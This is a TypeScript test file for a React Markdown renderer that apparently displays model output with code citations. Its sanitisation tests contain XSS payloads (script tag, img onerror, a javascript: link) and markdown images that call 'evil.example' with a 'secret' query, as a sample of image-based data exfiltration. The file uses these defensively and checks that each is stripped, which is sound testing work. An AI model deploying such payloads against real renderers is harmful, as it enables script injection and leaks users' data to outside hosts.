import { render, screen } from "@testing-library/react";
import { describe, expect, it } from "vitest";
import { InlineMarkdown, Markdown } from "./markdown-text";

describe("Markdown", () => {
  it("renders headings, lists, emphasis and code", () => {
    render(<Markdown text={"# Plan\n\nCall `loadReview` **first**.\n\n- one\n- two"} />);
    expect(screen.getByRole("heading", { name: "Plan" })).toBeTruthy();
    expect(screen.getByText("loadReview").tagName).toBe("CODE");
    expect(screen.getByText("first").tagName).toBe("STRONG");
    expect(screen.getAllByRole("listitem")).toHaveLength(2);
  });

  it("styles the GFM blocks that the browser reset would flatten", () => {
    const { container } = render(
      <Markdown text={"> quoted\n\n| a | b |\n|---|---|\n| 1 | 2 |\n\n---\n\n#### Small"} />,
    );
    expect(container.querySelector("blockquote")?.classList.contains("border-l-2")).toBe(true);
    expect(screen.getByRole("columnheader", { name: "a" }).classList.contains("border-b")).toBe(
      true,
    );
    expect(container.querySelector("hr")?.classList.contains("border-border")).toBe(true);
    expect(screen.getByRole("heading", { name: "Small" }).tagName).toBe("H4");
  });

  it("strips raw HTML", () => {
    const { container } = render(
      <Markdown text={'<script>alert(1)</script>\n\n<img src="x" onerror="alert(1)">'} />,
    );
    expect(container.querySelector("script")).toBeNull();
    expect(container.querySelector("[onerror]")).toBeNull();
  });

  it("drops images so model output cannot load remote URLs", () => {
    const { container } = render(
      <Markdown
        text={"![x](https://evil.example/?d=secret)\n\n![y][ref]\n\n[ref]: https://evil.example/r"}
      />,
    );
    expect(container.querySelector("img")).toBeNull();
  });

  it("drops javascript: link targets", () => {
    render(<Markdown text="[click](javascript:alert(1))" />);
    expect(screen.getByText("click").getAttribute("href")).toBeNull();
  });
});

describe("InlineMarkdown", () => {
  it("renders inline markdown without wrapping it in a paragraph", () => {
    const { container } = render(<InlineMarkdown text="Rename `userId` to `accountId`" />);
    expect(container.querySelector("p")).toBeNull();
    expect(screen.getByText("userId").tagName).toBe("CODE");
    expect(container.textContent).toBe("Rename userId to accountId");
  });

  it("passes plain text through unchanged", () => {
    const { container } = render(<InlineMarkdown text="Fix the cache" />);
    expect(container.innerHTML).toBe("Fix the cache");
  });
});

describe("Markdown citations", () => {
  const citations = {
    indexOf: (code: string) => (code === "src/a.ts:3" ? 0 : null),
    render: (index: number, code: string) => (
      <button>
        cite {index} {code}
      </button>
    ),
  };

  it("renders a cited code span through the citation renderer", () => {
    render(<Markdown text="See `src/a.ts:3`." citations={citations} />);
    expect(screen.getByRole("button", { name: "cite 0 src/a.ts:3" })).toBeTruthy();
  });

  it("keeps other inline code as code", () => {
    render(<Markdown text="Call `loadReview`." citations={citations} />);
    expect(screen.getByText("loadReview").tagName).toBe("CODE");
  });

  it("keeps ordinary links as links that open in a new tab", () => {
    render(<Markdown text="[docs](https://example.com)" citations={citations} />);
    const link = screen.getByRole("link", { name: "docs" });
    expect(link.getAttribute("href")).toBe("https://example.com");
    expect(link.getAttribute("target")).toBe("_blank");
  });
});
